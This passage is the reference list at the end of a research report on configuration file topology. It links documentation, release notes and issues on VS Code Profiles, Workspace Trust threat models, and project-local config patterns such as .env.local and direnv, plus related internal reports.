- [npm .npmrc docs](https://docs.npmjs.com/cli/v10/configuring-npm/npmrc)
- [Cursor rules docs](https://cursor.com/docs/context/rules)

**Profiles internals (D8):**
- [VS Code 1.75 release notes — Profiles GA](https://code.visualstudio.com/updates/v1_75)
- [VS Code 1.79 release notes — extension host restart on profile switch](https://code.visualstudio.com/updates/v1_79)
- [VS Code 1.81 release notes — Partial Profiles, Application Settings](https://code.visualstudio.com/updates/v1_81)
- [microsoft/vscode userDataProfile.ts (canonical interface)](https://github.com/microsoft/vscode/blob/main/src/vs/platform/userDataProfile/common/userDataProfile.ts)
- [Issue #208710 — Profile Sync data-loss on delete/recreate](https://github.com/microsoft/vscode/issues/208710)
- [Commit 1b291302 — Apply Extension to all Profiles implementation](https://github.com/microsoft/vscode/commit/1b291302df4068cad0516b8600e003c72c4a9b97)

**Threat models (D9):**
- [VS Code Workspace Trust blog (2021-07-06)](https://code.visualstudio.com/blogs/2021/07/06/workspace-trust)
- [VS Code Workspace Trust docs](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust)
- [VS Code Workspace Trust Extension Guide](https://code.visualstudio.com/api/extension-guides/workspace-trust)
- [ESLint Postmortem for Malicious Package Publishes (2018-07-12)](https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes/) — `eslint-scope@3.7.2` + `eslint-config-eslint@5.0.2`
- [Claude Code Sandboxing docs](https://code.claude.com/docs/en/sandboxing)
- [Help Net Security — Cursor default-off Workspace Trust (2025-09-11)](https://www.helpnetsecurity.com/2025/09/11/cursor-ai-editor-vulnerability/)
- [JetBrains IntelliJ Project Security docs](https://www.jetbrains.com/help/idea/project-security.html)

**Project-local-personal patterns (D10):**
- [Next.js environment-variables docs](https://nextjs.org/docs/pages/guides/environment-variables)
- [dotenv-flow GitHub](https://github.com/kerimdzhanov/dotenv-flow)
- [direnv stdlib `.envrc.private` example](https://direnv.net/man/direnv-stdlib.1.html)
- [direnv issue #556 — first-class `.envrc.local` request (open)](https://github.com/direnv/direnv/issues/556)
- [git gitignore(5) — `.git/info/exclude`](https://git-scm.com/docs/gitignore)
- [Docker Compose multiple-files merge](https://docs.docker.com/compose/multiple-compose-files/merge/)
- [lefthook local config](https://lefthook.dev/usage/features/local.html)
- [Husky how-to](https://typicode.github.io/husky/how-to.html)
- [VS Code issue #40233 (open since 2017) — `.vscode/settings.local.json` request](https://github.com/microsoft/vscode/issues/40233)
- [VS Code issue #282806 (Dec 2025, open) — `.code-workspace.local` request citing `.env.local` precedent](https://github.com/microsoft/vscode/issues/282806)

### Related Research
- [reports/config-edit-paths/](../config-edit-paths/REPORT.md) — Config-File CRUD Architecture: YAML round-trip, schema bridges, form libraries, MCP tool patterns. Goes deeper on the *engineering* of editing configs (yaml@2 vs js-yaml, Zod ↔ JSON Schema bridges, JSON Forms / RJSF, monaco-yaml, in-app schema-aware YAML editors). Complements this report's *topology* focus.
- `~/.claude/reports/claude-code-configuration-resolution/REPORT.md` (2026-03-28) — Earlier deep dive on Claude Code's MCP server / skill / subagent resolution chains specifically. Several findings here update that report (commands→skills merger; subagent frontmatter expansions; MCP `--scope` rename).
- [reports/config-driven-folder-frontmatter/](../config-driven-folder-frontmatter/REPORT.md) — Folder-frontmatter prior art (Hugo cascade, Astro content collections, Biome, Turborepo, Fumadocs meta.json, etc.). Adjacent landscape on per-directory metadata cascades.
